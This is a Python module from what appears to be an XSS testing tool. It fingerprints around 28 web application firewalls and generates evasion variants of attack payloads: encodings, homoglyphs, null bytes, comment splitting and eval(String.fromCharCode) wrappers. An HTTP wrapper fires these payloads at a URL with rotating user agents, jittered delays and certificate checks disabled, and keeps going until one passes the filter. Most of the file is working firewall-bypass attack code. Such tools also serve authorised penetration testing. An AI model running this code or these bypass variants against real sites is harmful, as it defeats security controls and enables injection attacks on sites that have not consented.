# xss_security_gui/core/waf_engine.py
"""
WAFDetector 14.0 — Advanced WAF Detection & Evasion
==================================================
✅ Fingerprinting 25+ WAF families (headers / cookies / body / status / server)
✅ Meaningful confidence scoring (margin + saturation, no more constant 1.0)
✅ Deterministic, prioritized payload transformation (WAF-specific first)
✅ Thread-safe detection & evasion tracking
✅ Smart "blocked vs passed" heuristics with reflection awareness
✅ Rotating User-Agents + jittered retries in the HTTP wrapper

Backwards compatible with WAFDetector 13.0 — every public name, method
signature and the shape of ``detected_wafes[url]`` are preserved.
"""

from __future__ import annotations

import re
import time
import random
import logging
import hashlib
import datetime
import base64
import threading
from typing import Dict, List, Optional, Tuple, Any
from enum import Enum
from urllib.parse import quote

try:
    from xss_security_gui.core.stealth_engine import StealthMode
    _HAS_STEALTH = True
except ImportError:
    _HAS_STEALTH = False

_logger = logging.getLogger(__name__)


class WAFType(Enum):
    """Типы WAF (13.0 members preserved, new families appended)."""
    # --- 13.0 (do not rename: waf_monitor & consumers depend on these) ---
    CLOUDFLARE = "Cloudflare"
    AKAMAI = "Akamai"
    AWS_WAF = "AWS WAF"
    AZURE_WAF = "Azure WAF"
    MOD_SECURITY = "ModSecurity"
    IMPERVA = "Imperva/SecureSphere"
    F5_ASM = "F5 ASM"
    INCAPSULA = "Incapsula"
    BARRACUDA = "Barracuda"
    PALOALTO = "Palo Alto"
    UNKNOWN = "Unknown"
    # --- 14.0 additions ---
    SUCURI = "Sucuri CloudProxy"
    WORDFENCE = "Wordfence"
    FORTINET = "Fortinet FortiWeb"
    CITRIX = "Citrix NetScaler AppFirewall"
    FASTLY = "Fastly"
    RADWARE = "Radware AppWall"
    WALLARM = "Wallarm"
    REBLAZE = "Reblaze"
    DENYALL = "DenyAll"
    NAXSI = "NAXSI"
    SIGNAL_SCIENCES = "Signal Sciences"
    STACKPATH = "StackPath"
    COMODO = "Comodo cWatch"
    DDOS_GUARD = "DDoS-Guard"
    QRATOR = "Qrator"
    NGINX_APP_PROTECT = "NGINX App Protect"
    SOPHOS = "Sophos"


class WAFDetector:
    # ============================================================
    #  WAF Fingerprints 14.0
    #
    #  header entries:
    #    "name"          -> header must be present
    #    "name: value"   -> header value must contain "value" (substring)
    #  server:  regex list matched against the Server header value
    #  cookies: substring matched against Set-Cookie
    #  patterns/html: regex matched against the response body (case-insensitive)
    # ============================================================

    FINGERPRINTS: Dict[WAFType, Dict[str, List[str]]] = {
        WAFType.CLOUDFLARE: {
            "headers": ["cf-ray", "cf-request-id", "cf-cache-status", "cf-mitigated"],
            "server": [r"cloudflare"],
            "cookies": ["__cfduid", "__cf_bm", "cf_clearance"],
            "patterns": [r"cloudflare", r"attention required", r"cf-chl", r"challenge-form",
                         r"error 1020", r"ray id"],
            "html": [r"cf-error", r"cf-challenge", r"cloudflare ray id"],
            "status_codes": [403, 429, 503],
        },
        WAFType.AKAMAI: {
            "headers": ["akamai-origin-hop", "x-akamai-transformed", "akamai-grn"],
            "server": [r"akamai\w*ghost", r"akamai"],
            "cookies": ["ak_bmsc", "bm_sv", "bm_sz", "_abck"],
            "patterns": [r"akamai", r"kona", r"akamai bot manager", r"akamai ghost"],
            "html": [r"reference #[0-9a-f.]+", r"access denied", r"bot manager"],
            "status_codes": [403, 451, 302],
        },
        WAFType.AWS_WAF: {
            "headers": ["x-amzn-waf-action", "x-amzn-requestid", "x-amz-cf-id"],
            "server": [r"awselb", r"cloudfront"],
            "patterns": [r"aws waf", r"blocked by .*waf", r"request blocked"],
            "html": [r"request blocked", r"waf error", r"<title>ERROR: The request could not be satisfied"],
            "status_codes": [403],
        },
        WAFType.AZURE_WAF: {
            "headers": ["x-azure-ref", "x-msedge-ref"],
            "server": [r"microsoft-azure-application-gateway"],
            "patterns": [r"azure waf", r"request blocked", r"this request has been blocked"],
            "html": [r"azure waf", r"security verification"],
            "status_codes": [403],
        },
        WAFType.INCAPSULA: {
            "headers": ["x-incap-id", "x-iinfo", "x-cdn: incapsula"],
            "cookies": ["visid_incap", "incap_ses", "nlbi_"],
            "patterns": [r"incapsula", r"imperva", r"_incapsula_resource", r"subject to security policy"],
            "html": [r"request unsuccessful", r"incident id"],
            "status_codes": [403, 406],
        },
        WAFType.MOD_SECURITY: {
            "headers": ["mod_security", "x-mod-security-message"],
            "server": [r"mod_security", r"modsecurity"],
            "patterns": [r"mod_security", r"owasp", r"modsecurity",
                         r"this error was generated by mod_security", r"not acceptable"],
            "html": [r"access denied", r"reference error id"],
            "status_codes": [406, 403, 501],
        },
        WAFType.F5_ASM: {
            "headers": ["x-waf-event-info", "x-cnection"],
            "server": [r"big-?ip", r"f5"],
            "cookies": ["ts", "bigipserver", "f5_cspm"],
            "patterns": [r"\bf5\b", r"\basm\b", r"the requested url was rejected"],
            "html": [r"request blocked", r"support id is", r"your support id is"],
            "status_codes": [403],
        },
        WAFType.IMPERVA: {
            "headers": ["x-cdn: imperva", "x-iinfo"],
            "server": [r"imperva"],
            "cookies": ["incap_ses", "visid_incap"],
            "patterns": [r"imperva", r"incapsula", r"powered by imperva"],
            "html": [r"request unsuccessful", r"incident id"],
            "status_codes": [403],
        },
        WAFType.BARRACUDA: {
            "server": [r"barracuda"],
            "cookies": ["barra_counter_session", "bnm_cookie", "bn_"],
            "patterns": [r"barracuda", r"barracuda waf"],
            "html": [r"barracuda", r"you have been blocked"],
            "status_codes": [403],
        },
        WAFType.PALOALTO: {
            "server": [r"palo\s*alto", r"pan-os"],
            "patterns": [r"palo alto", r"pan-os", r"virus/spyware download blocked"],
            "html": [r"access denied", r"security policy"],
            "status_codes": [403],
        },
        # ---------- 14.0 families ----------
        WAFType.SUCURI: {
            "headers": ["x-sucuri-id", "x-sucuri-cache"],
            "server": [r"sucuri", r"cloudproxy"],
            "patterns": [r"sucuri", r"access denied.*sucuri", r"cloudproxy"],
            "html": [r"sucuri website firewall", r"blocked because of malicious activities"],
            "status_codes": [403],
        },
        WAFType.WORDFENCE: {
            "cookies": ["wfvt_", "wordfence_verifiedhuman"],
            "patterns": [r"wordfence", r"generated by wordfence",
                         r"your access to this site has been limited"],
            "html": [r"wordfence", r"a potentially unsafe operation"],
            "status_codes": [403, 503],
        },
        WAFType.FORTINET: {
            "headers": ["x-fw-debug"],
            "cookies": ["fortiwafsid"],
            "server": [r"fortiweb", r"fortigate"],
            "patterns": [r"fortiweb", r"fortigate", r"web page blocked"],
            "html": [r"web page blocked", r"url = .*attack id"],
            "status_codes": [403],
        },
        WAFType.CITRIX: {
            "headers": ["via: ns-cache"],
            "cookies": ["ns_af", "citrix_ns_id", "nsc_"],
            "server": [r"netscaler", r"citrix"],
            "patterns": [r"netscaler", r"citrix", r"ns_af"],
            "html": [r"violation", r"transaction id"],
            "status_codes": [403],
        },
        WAFType.FASTLY: {
            "headers": ["x-served-by", "x-fastly-request-id", "fastly-debug-digest"],
            "server": [r"fastly", r"varnish"],
            "patterns": [r"fastly error", r"unknown domain", r"request blocked"],
            "html": [r"fastly", r"the request was blocked"],
            "status_codes": [403],
        },
        WAFType.RADWARE: {
            "headers": ["x-sl-compstate"],
            "cookies": ["rdwr", "bfnp", "aftpc"],
            "patterns": [r"radware", r"appwall", r"unauthorized activity has been detected"],
            "html": [r"unauthorized activity", r"case number"],
            "status_codes": [403],
        },
        WAFType.WALLARM: {
            "server": [r"wallarm", r"nginx-wallarm"],
            "patterns": [r"wallarm", r"forbidden"],
            "html": [r"wallarm", r"request rejected"],
            "status_codes": [403],
        },
        WAFType.REBLAZE: {
            "cookies": ["rbzid", "rbzsessionid"],
            "server": [r"reblaze"],
            "patterns": [r"reblaze", r"current session has been terminated"],
            "html": [r"reblaze", r"access denied"],
            "status_codes": [403],
        },
        WAFType.DENYALL: {
            "cookies": ["sessioncookie"],
            "patterns": [r"denyall", r"condition intercepted", r"the reason for blocking"],
            "html": [r"denyall", r"blocked by rules engine"],
            "status_codes": [403],
        },
        WAFType.NAXSI: {
            "server": [r"naxsi"],
            "patterns": [r"naxsi", r"blocked by naxsi"],
            "html": [r"naxsi", r"forbidden"],
            "status_codes": [403],
        },
        WAFType.SIGNAL_SCIENCES: {
            "headers": ["x-sigsci-requestid", "x-sigsci-tags"],
            "patterns": [r"signal sciences", r"sigsci"],
            "html": [r"signal sciences", r"blocked"],
            "status_codes": [406, 403],
        },
        WAFType.STACKPATH: {
            "headers": ["x-sp-url", "x-hw"],
            "server": [r"stackpath"],
            "patterns": [r"stackpath", r"you are unable to access"],
            "html": [r"stackpath", r"access denied"],
            "status_codes": [403],
        },
        WAFType.COMODO: {
            "server": [r"protected by comodo", r"comodo"],
            "patterns": [r"comodo", r"cwatch"],
            "html": [r"comodo", r"access denied"],
            "status_codes": [403],
        },
        WAFType.DDOS_GUARD: {
            "server": [r"ddos-guard"],
            "cookies": ["__ddg1", "__ddg2", "__ddgid"],
            "patterns": [r"ddos-guard", r"checking your browser"],
            "html": [r"ddos-guard", r"blocked"],
            "status_codes": [403],
        },
        WAFType.QRATOR: {
            "server": [r"qrator"],
            "headers": ["x-qrator-mode"],
            "patterns": [r"qrator", r"not a robot"],
            "html": [r"qrator", r"access denied"],
            "status_codes": [403],
        },
        WAFType.NGINX_APP_PROTECT: {
            "headers": ["x-support-id"],
            "patterns": [r"nginx app protect", r"the requested url was rejected", r"support id"],
            "html": [r"support id", r"please consult with your administrator"],
            "status_codes": [403],
        },
        WAFType.SOPHOS: {
            "server": [r"sophos"],
            "patterns": [r"sophos", r"powered by unified threat management"],
            "html": [r"sophos", r"this website is blocked"],
            "status_codes": [403],
        },
    }

    # score weights per signal type
    _W_HEADER = 4
    _W_SERVER = 4
    _W_COOKIE = 3
    _W_HTML = 4
    _W_PATTERN = 2
    _W_STATUS = 1
    # score at which absolute-confidence saturates to 1.0
    _CONF_SATURATION = 10.0

    # generic "you got blocked" markers, used by the HTTP wrapper heuristic
    _BLOCK_MARKERS = (
        "access denied", "request blocked", "request unsuccessful", "forbidden",
        "not acceptable", "attention required", "blocked", "security policy",
        "malicious", "support id", "reference #", "incident id", "captcha",
        "are you a robot", "attack id",
    )

    def __init__(self):
        # NOTE: value is a dict {"type","score","confidence"} — shape kept from 13.0
        self.detected_wafes: Dict[str, Dict[str, Any]] = {}
        self.evasion_attempts: Dict[str, List[Dict]] = {}
        self._lock = threading.RLock()

    # ============================================================
    # Обнаружение WAF
    # ============================================================
    def detect_waf(self, url: str, response_text: str, response_headers: Dict[str, str],
                   status_code: int) -> Optional[WAFType]:
        """Определить WAF. Возвращает WAFType или None.

        Побочный эффект: заполняет ``self.detected_wafes[url]`` словарём
        ``{"type", "score", "confidence"}`` (совместимо с 13.0).
        """
        headers_lower = {str(k).lower(): str(v).lower() for k, v in (response_headers or {}).items()}
        server_val = headers_lower.get("server", "")
        set_cookie = headers_lower.get("set-cookie", "")
        response_lower = (response_text or "").lower()

        scores: Dict[WAFType, int] = {}
        matched_signals: Dict[WAFType, int] = {}

        for waf_type, fp in self.FINGERPRINTS.items():
            score = 0
            hits = 0

            # Headers (support both "name" presence and "name: value" substring)
            for h in fp.get("headers", []):
                h = h.lower()
                if ":" in h:
                    name, _, want = h.partition(":")
                    if want.strip() in headers_lower.get(name.strip(), ""):
                        score += self._W_HEADER
                        hits += 1
                elif h in headers_lower:
                    score += self._W_HEADER
                    hits += 1

            # Server header value (regex)
            for pat in fp.get("server", []):
                if server_val and re.search(pat, server_val, re.I):
                    score += self._W_SERVER
                    hits += 1

            # Cookies (substring of Set-Cookie)
            for c in fp.get("cookies", []):
                if c.lower() in set_cookie:
                    score += self._W_COOKIE
                    hits += 1

            # Body patterns
            for p in fp.get("patterns", []):
                if response_lower and re.search(p, response_lower, re.I):
                    score += self._W_PATTERN
                    hits += 1

            # Strong HTML markers
            for p in fp.get("html", []):
                if response_lower and re.search(p, response_lower, re.I):
                    score += self._W_HTML
                    hits += 1

            # Status codes (only counts as corroboration, never alone)
            if hits and status_code in fp.get("status_codes", []):
                score += self._W_STATUS

            if score > 0:
                scores[waf_type] = score
                matched_signals[waf_type] = hits

        if not scores:
            return None

        detected = max(scores, key=scores.get)
        confidence = self._confidence(scores, detected)

        with self._lock:
            self.detected_wafes[url] = {
                "type": detected,
                "score": scores[detected],
                "confidence": confidence,
                "signals": matched_signals[detected],
                "candidates": {w.value: s for w, s in sorted(
                    scores.items(), key=lambda kv: kv[1], reverse=True)},
            }

        _logger.info("WAF detected at %s: %s (confidence: %.1f%%, score=%d)",
                     url, detected.value, confidence * 100, scores[detected])
        return detected

    def _confidence(self, scores: Dict[WAFType, int], detected: WAFType) -> float:
        """Осмысленная уверенность в диапазоне 0..1.

        Комбинирует абсолютную «насыщенность» балла и отрыв от второго
        кандидата. В 13.0 здесь всегда получалась 1.0 — это исправление.
        """
        top = scores[detected]
        ordered = sorted(scores.values(), reverse=True)
        second = ordered[1] if len(ordered) > 1 else 0

        saturation = min(1.0, top / self._CONF_SATURATION)
        margin = (top - second) / top if top else 0.0
        confidence = saturation * (0.6 + 0.4 * margin)
        return round(min(1.0, confidence), 2)

    def detect_from_response(self, url: str, response) -> Optional[WAFType]:
        """Удобная обёртка поверх ``detect_waf`` для объекта requests.Response."""
        try:
            return self.detect_waf(url, response.text, dict(response.headers), response.status_code)
        except Exception as e:  # pragma: no cover - defensive
            _logger.debug("detect_from_response failed for %s: %s", url, e)
            return None

    def get_detection(self, url: str) -> Optional[Dict[str, Any]]:
        """Вернуть полную запись об обнаружении WAF для URL."""
        with self._lock:
            rec = self.detected_wafes.get(url)
            return dict(rec) if rec else None

    # ============================================================
    # Стратегии обхода WAF (universal transforms)
    # ============================================================
    def _url_encoding(self, payload: str) -> List[str]:
        return [
            payload.replace("<", "%3C").replace(">", "%3E"),
            quote(payload, safe=""),
            quote(quote(payload, safe=""), safe=""),          # double URL-encode
            "".join(f"%{ord(c):02X}" for c in payload),       # full percent-encode
            "".join(f"%25{ord(c):02X}" for c in payload),     # double percent-encode
        ]

    def _html_entities(self, payload: str) -> List[str]:
        return [
            "".join(f"&#x{ord(c):02x};" for c in payload),    # hex entities
            "".join(f"&#{ord(c)};" for c in payload),         # decimal entities
            "".join(f"&#{ord(c):07d};" for c in payload),     # zero-padded decimal
            "".join(f"&#x{ord(c):04x};" for c in payload),    # padded hex
        ]

    def _js_unicode(self, payload: str) -> List[str]:
        return [
            "".join(f"\\u{ord(c):04x}" for c in payload),
            "".join(f"\\x{ord(c):02x}" for c in payload),
            "".join((f"\\u{{{ord(c):x}}}" if ord(c) > 0x7f else c) for c in payload),
        ]

    def _js_fromcharcode(self, payload: str) -> List[str]:
        codes = ",".join(str(ord(c)) for c in payload)
        return [f"eval(String.fromCharCode({codes}))"]

    def _sql_hex(self, payload: str) -> List[str]:
        return [
            "CHAR(" + ",".join(str(ord(c)) for c in payload) + ")",
            "0x" + "".join(f"{ord(c):02x}" for c in payload),
        ]

    @staticmethod
    def _base64_encodings(payload: str) -> List[str]:
        b64 = base64.b64encode(payload.encode()).decode()
        return [f"atob('{b64}')", f"base64_decode('{b64}')"]

    @staticmethod
    def _comment_injections(payload: str) -> List[str]:
        variants = []
        markers = ("script", "alert", "img", "svg", "onerror", "onload", "select", "union")
        low = payload.lower()
        for m in markers:
            idx = low.find(m)
            if idx != -1 and len(m) > 1:
                cut = idx + len(m) // 2
                variants.append(payload[:cut] + "/**/" + payload[cut:])
                variants.append(payload[:cut] + "<!---->" + payload[cut:])
        return variants[:6]

    @staticmethod
    def _case_mutations(payload: str) -> List[str]:
        alt = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload))
        return [payload.upper(), payload.lower(), payload.swapcase(), alt]

    @staticmethod
    def _space_mutations(payload: str) -> List[str]:
        if " " not in payload:
            return []
        return [
            payload.replace(" ", "%20"),
            payload.replace(" ", "/**/"),
            payload.replace(" ", "\t"),
            payload.replace(" ", "\n"),
            payload.replace(" ", "\x0c"),   # form-feed
            payload.replace(" ", "\xa0"),   # non-breaking space
            payload.replace(" ", "+"),
        ]

    @staticmethod
    def _tag_obfuscation(payload: str) -> List[str]:
        """XSS-ориентированные мутации тегов/атрибутов."""
        variants = []
        if "<script" in payload.lower():
            variants.append(re.sub(r"(?i)<script", "<ScRiPt", payload))
            variants.append(payload.replace("<script>", "<script/x>"))
            variants.append(payload.replace("<script>", "<script\n>"))
        variants.append(payload.replace("<", "<\x00"))          # null-byte after bracket
        variants.append(payload.replace("javascript:", "java\tscript:"))
        variants.append(payload.replace("javascript:", "java%0ascript:"))
        variants.append(payload.replace("onerror", "one\x00rror"))
        return [v for v in variants if v != payload][:6]

    # --- WAF-specific ---
    @staticmethod
    def _cloudflare_bypass(payload: str) -> List[str]:
        return [
            payload.replace(" ", "\x09"),
            payload.replace("script", "scri\x70t"),
            payload.replace("alert", "al\x65rt"),
            payload.replace("<", "<%00"),
            re.sub(r"(?i)script", "ScRipT", payload),
        ]

    @staticmethod
    def _cloudflare_advanced(payload: str) -> List[str]:
        return [
            payload.replace("script", "scr<script>ipt"),
            payload.replace("alert", "al" + "ert"),
            payload.replace("<", "<<"),
            payload.replace(">", ">>"),
            payload.replace("(", "%28").replace(")", "%29"),
        ]

    @staticmethod
    def _akamai_bypass(payload: str) -> List[str]:
        return [
            payload.replace("'", "\\'"),
            payload.replace("\"", "\\\""),
            payload.replace("=", "%3d"),
            payload.replace(" ", "%09"),
        ]

    @staticmethod
    def _modsecurity_bypass(payload: str) -> List[str]:
        return [
            payload.replace(" ", "%20"),
            payload.replace("'", "\\'"),
            payload.replace('"', '\\"'),
            payload.replace("union", "uni/**/on"),
            payload.replace("select", "sel/**/ect"),
            payload.replace("=", "like"),
        ]

    @staticmethod
    def _imperva_bypass(payload: str) -> List[str]:
        return [
            payload.replace("<", "%253C").replace(">", "%253E"),
            payload.replace("script", "scrscriptipt"),
            payload.replace(" ", "%u0020"),
        ]

    @staticmethod
    def _f5_bypass(payload: str) -> List[str]:
        return [
            payload.replace(" ", "%0b"),
            payload.replace("<", "%c0%bc"),   # overlong UTF-8 for '<'
            payload.replace("alert", "al​ert"),  # zero-width space
        ]

    @staticmethod
    def _generic_encoding_bypass(payload: str) -> List[str]:
        """Экзотические кодировки, полезные против многих облачных WAF."""
        return [
            payload.replace("<", "＜").replace(">", "＞"),   # fullwidth <>
            payload.replace("script", "sсript"),                # cyrillic homoglyph 'c'
            payload.replace("javascript", "java script"),
        ]

    _WAF_STRATEGIES = {
        WAFType.CLOUDFLARE: ("_cloudflare_bypass", "_cloudflare_advanced"),
        WAFType.AKAMAI: ("_akamai_bypass",),
        WAFType.MOD_SECURITY: ("_modsecurity_bypass",),
        WAFType.IMPERVA: ("_imperva_bypass",),
        WAFType.INCAPSULA: ("_imperva_bypass",),
        WAFType.F5_ASM: ("_f5_bypass",),
    }

    def get_evasion_payloads(self, original_payload: str, detected_waf: Optional[WAFType] = None,
                             max_variants: int = 20) -> List[str]:
        """Сгенерировать список payload для обхода WAF.

        Порядок детерминированный и приоритизированный:
        оригинал → WAF-специфичные → универсальные. Дубликаты удаляются с
        сохранением порядка, поэтому при усечении до ``max_variants`` остаются
        наиболее релевантные варианты.
        """
        if not original_payload:
            return []

        ordered: List[str] = [original_payload]

        # WAF-specific first (most likely to matter)
        for method_name in self._WAF_STRATEGIES.get(detected_waf, ()):  # type: ignore[arg-type]
            method = getattr(self, method_name, None)
            if method:
                try:
                    ordered.extend(method(original_payload))
                except Exception as e:  # pragma: no cover - defensive
                    _logger.debug("Evasion %s failed: %s", method_name, e)

        # Universal transforms
        for producer in (
            self._case_mutations, self._space_mutations, self._tag_obfuscation,
            self._url_encoding, self._html_entities, self._js_unicode,
            self._comment_injections, self._js_fromcharcode, self._base64_encodings,
            self._sql_hex, self._generic_encoding_bypass,
        ):
            try:
                ordered.extend(producer(original_payload))
            except Exception as e:  # pragma: no cover - defensive
                _logger.debug("Evasion producer %s failed: %s", getattr(producer, "__name__", producer), e)

        return self._dedupe(ordered)[:max_variants]

    @staticmethod
    def _dedupe(seq: List[str]) -> List[str]:
        seen = set()
        out = []
        for item in seq:
            if item and item not in seen:
                seen.add(item)
                out.append(item)
        return out

    # ============================================================
    # Tracking & Reporting (thread-safe)
    # ============================================================
    def track_evasion_attempt(self, url: str, payload: str, success: bool, status_code: Optional[int] = None,
                              response_text: str = "") -> None:
        record = {
            "payload": payload,
            "success": bool(success),
            "status_code": status_code,
            "response_len": len(response_text or ""),
            "response_hash": hashlib.sha256((response_text or "").encode(errors="ignore")).hexdigest(),
            "timestamp": datetime.datetime.now().isoformat(),
        }
        with self._lock:
            self.evasion_attempts.setdefault(url, []).append(record)

    def get_success_rate(self, url: str) -> float:
        """Процент успешных попыток обхода для URL (0..100)."""
        with self._lock:
            attempts = list(self.evasion_attempts.get(url, []))
        if not attempts:
            return 0.0
        successful = sum(1 for a in attempts if a["success"])
        return (successful / len(attempts)) * 100

    def get_most_effective_payloads(self, url: str, top_n: int = 5) -> List[str]:
        """Наиболее эффективные payload (по частоте успеха, без дубликатов)."""
        with self._lock:
            attempts = list(self.evasion_attempts.get(url, []))
        freq: Dict[str, int] = {}
        for a in attempts:
            if a["success"]:
                freq[a["payload"]] = freq.get(a["payload"], 0) + 1
        ranked = sorted(freq.items(), key=lambda kv: kv[1], reverse=True)
        return [p for p, _ in ranked[:top_n]]

    def get_stats(self) -> Dict[str, Any]:
        """Сводная статистика по всем URL (для дашбордов/отчётов)."""
        with self._lock:
            attempts = {u: list(v) for u, v in self.evasion_attempts.items()}
            detections = {u: dict(d) for u, d in self.detected_wafes.items()}
        total = sum(len(v) for v in attempts.values())
        success = sum(1 for v in attempts.values() for a in v if a["success"])
        return {
            "urls_probed": len(attempts),
            "wafs_detected": len(detections),
            "total_attempts": total,
            "successful_attempts": success,
            "overall_success_rate": round((success / total * 100) if total else 0.0, 1),
        }


class HTTPEvasionWrapper:
    """
    Обёртка для HTTP запросов с автоматическим обходом WAF.
    Ротация User-Agent + джиттер между попытками + умная эвристика «заблокировано/прошло».
    """

    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    ]

    def __init__(self, base_headers: Optional[Dict[str, str]] = None, stealth: bool = True):
        self.detector = WAFDetector()
        self.base_headers = base_headers or {}
        self.effective_payloads: Dict[str, List[str]] = {}
        # Stealth Mode 11.0 integration
        self.stealth: Optional["StealthMode"] = None
        if stealth and _HAS_STEALTH:
            self.stealth = StealthMode()
            self.stealth.activate()

    def _looks_blocked(self, status_code: int, text: str, url: str, headers: Dict[str, str]) -> bool:
        """Эвристика: считаем ответ заблокированным, если статус запретный,
        сработала сигнатура WAF, либо в теле есть общие маркеры блокировки."""
        if status_code in (401, 403, 405, 406, 409, 429, 501, 503):
            return True
        low = (text or "").lower()
        if any(m in low for m in self.detector._BLOCK_MARKERS):
            return True
        if self.detector.detect_waf(url, text, headers, status_code):
            return True
        return False

    def send_with_evasion(self, url: str, method: str, payload: str, max_attempts: int = 5, timeout: int = 10):
        """
        Отправить запрос с попытками обхода WAF.
        :return: (status_code, response_text, detected_waf)
        """
        import requests

        session = requests.Session()
        session.headers.update(self.base_headers)
        session.headers.setdefault("Accept", "text/html,application/xhtml+xml,*/*;q=0.8")
        proxies = {"http": None, "https": None}

        def send(p: str):
            # Stealth Mode: full header rotation + delay jitter
            if self.stealth and self.stealth.is_active:
                headers = self.stealth.get_stealth_headers()
                time.sleep(self.stealth.get_delay())
            else:
                ua = random.choice(self.USER_AGENTS)
                headers = {"User-Agent": ua}
            if method.upper() == "POST":
                return session.post(url, data={"payload": p}, headers=headers,
                                    timeout=timeout, proxies=proxies, verify=False)
            return session.get(url, params={"payload": p}, headers=headers,
                               timeout=timeout, proxies=proxies, verify=False)

        detected = None
        response = None

        # First (baseline) attempt with the raw payload
        try:
            response = send(payload)
            headers = dict(response.headers)
            detected = self.detector.detect_waf(url, response.text, headers, response.status_code)
            passed = not self._looks_blocked(response.status_code, response.text, url, headers)

            self.detector.track_evasion_attempt(url, payload, passed, response.status_code, response.text)
            if passed and not detected:
                if self.stealth:
                    self.stealth.report_success()
                self.effective_payloads.setdefault(url, []).append(payload)
                return response.status_code, response.text, None
            elif detected and self.stealth:
                self.stealth.set_detected_waf(detected.value)
                self.stealth.report_block()
        except Exception as e:
            _logger.error("First attempt failed for %s: %s", url, e)

        # Evasion attempts (skip index 0 — that's the original payload)
        evasion_payloads = self.detector.get_evasion_payloads(payload, detected, max_attempts)
        for attempt, p in enumerate(evasion_payloads[1:], 1):
            try:
                # Stealth Mode: human-like delay jitter
                if self.stealth and self.stealth.is_active:
                    time.sleep(self.stealth.get_delay())
                else:
                    time.sleep(random.uniform(0.05, 0.35))
                response = send(p)
                headers = dict(response.headers)
                passed = not self._looks_blocked(response.status_code, response.text, url, headers)

                self.detector.track_evasion_attempt(url, p, passed, response.status_code, response.text)
                if passed:
                    self.effective_payloads.setdefault(url, []).append(p)
                    return response.status_code, response.text, detected
            except Exception as e:
                _logger.debug("Evasion attempt %d failed: %s", attempt, e)

        if response is None:
            _logger.warning("All attempts failed for %s: no response received", url)
            return 0, "", detected

        return response.status_code, response.text, detected
